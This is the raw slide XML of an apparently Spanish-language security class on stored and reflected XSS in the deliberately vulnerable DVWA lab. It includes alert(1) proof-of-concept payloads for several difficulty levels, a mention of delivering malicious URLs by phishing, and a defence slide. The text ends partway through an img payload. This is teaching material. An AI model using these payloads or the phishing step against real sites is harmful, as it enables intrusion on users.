            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7372486" y="1228272"/>
            <a:ext cx="3804285" cy="2006600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Imagen 13" descr="Interfaz de usuario gráfica, Texto, Aplicación, Correo electrónico&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E188D4AE-E04F-E6FD-6CBF-2AA8AA390F48}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6675849" y="3436384"/>
            <a:ext cx="4129405" cy="2543810"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41582654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0363" y="210501"/>
            <a:ext cx="8784976" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección XSS Almacenado – ataques - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>medium</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{74E7066D-F037-D1E6-4106-9E1759124557}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="503649" y="1233588"/>
            <a:ext cx="6096000" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Y enviamos el mensaje </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4" descr="Interfaz de usuario gráfica, Texto, Aplicación&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E51D5848-6C6E-03C2-6213-FA9767022EDC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4122780" y="1233588"/>
            <a:ext cx="5400040" cy="2858770"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Imagen 5" descr="Interfaz de usuario gráfica, Texto, Aplicación, Word&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FAEDFCB3-22E9-6227-9CDB-124EB5BFD1F4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4534003" y="5007354"/>
            <a:ext cx="5400040" cy="1530350"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="CuadroTexto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B427116-8A1F-60B2-9D6B-671E37C8C4B7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340363" y="4397572"/>
            <a:ext cx="10969894" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Al actualizar la página comprobamos que se ha introducido la inyección y, por lo tanto, cualquier consulta en el foro logrará la inyección</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21666872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0363" y="210501"/>
            <a:ext cx="8784976" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección XSS Almacenado – ataques - High</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Marcador de texto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5BFA20D-6818-421E-B1DE-4A37A34B161C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="692019" y="1113117"/>
            <a:ext cx="5904656" cy="386657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s-ES" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>High</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>: “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>&lt;a onclick="alert(1)"&gt;test&lt;/a&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>” más el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>burp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> suite </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>para inyectarlo en el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>nombre</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Imagen 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{773072A5-DF0A-4353-B332-1655BA068EC2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7078211" y="1344014"/>
            <a:ext cx="4421770" cy="3866571"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9074404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340362" y="210501"/>
            <a:ext cx="9554751" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección XSS Almacenado – ataques - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Impossible</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="CuadroTexto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{78CE2B28-DBE6-F575-BD38-BF540B014F20}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340362" y="1255263"/>
            <a:ext cx="6096000" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>La defensa del imposible es evitar los caracteres especiales como el “&lt;”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Imagen 5" descr="Texto&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D88D11D1-E6DE-429A-B302-0352CE246629}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="1255263"/>
            <a:ext cx="5264785" cy="1918970"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="CuadroTexto 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{26564F09-4377-087D-B88F-EF41EBD6A8F9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="446315" y="3244334"/>
            <a:ext cx="6096000" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>El resultado obtenido es</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Imagen 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CCFBB1EB-1DBF-68FD-2E5D-5DAFA207D78A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6066248" y="3553592"/>
            <a:ext cx="3888373" cy="2313808"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8264512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23392" y="476008"/>
            <a:ext cx="8784976" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección XSS Almacenado - defensas</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Marcador de texto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5BFA20D-6818-421E-B1DE-4A37A34B161C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="911424" y="1340768"/>
            <a:ext cx="2520280" cy="115449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s-ES" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Medium</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="2000" b="1"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s-ES" sz="2000" b="1"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r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>High</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="2000" b="1"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s-ES" sz="2000" b="1"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s-ES" sz="2000" b="1"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s-ES" sz="2000" b="1"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r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Impossible</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Imagen 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{52B486C7-417E-4D2E-A42B-C344DC838A11}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3287688" y="2272308"/>
            <a:ext cx="8783276" cy="1381318"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Imagen 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C121608A-5A57-41B1-8DAB-C595DAB1BE9B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5879975" y="1149305"/>
            <a:ext cx="5751893" cy="1229846"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Imagen 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D88D11D1-E6DE-429A-B302-0352CE246629}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4007768" y="3789040"/>
            <a:ext cx="7904619" cy="2881979"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16874812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23392" y="476008"/>
            <a:ext cx="8784976" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección XSS Reflejado</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Marcador de texto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5BFA20D-6818-421E-B1DE-4A37A34B161C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="767408" y="1120018"/>
            <a:ext cx="6120680" cy="65279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panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>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Se ataca por GET pero no en la URL, en este caso hay un campo de texto.</a:t>
            </a:r>
          </a:p>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Se necesita enviar la URL maliciosa por </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>pishing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> o similar</a:t>
            </a:r>
          </a:p>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Low: &lt;script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(1)&lt;/script&gt;</a:t>
            </a:r>
          </a:p>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Medium/High: &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>src</a:t>
